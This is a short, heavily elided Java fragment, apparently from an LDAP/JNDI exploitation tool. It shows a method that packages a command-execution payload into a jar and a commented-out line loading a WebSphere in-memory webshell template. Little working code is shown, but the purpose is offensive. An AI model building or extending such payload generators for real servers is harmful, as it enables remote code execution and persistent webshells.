    ...
    */
    private static String createJar(String type, String... params) throws Exception {
        ...
        if (type.toLowerCase().equals("command")) {
            CommandTemplates commandTemplate = new CommandTemplates(params[0], "xExportObject");
...
//            CtClass exploitClass = classPool.get("com.idiot9.ldap.template.WebsphereMemshellTemplate");
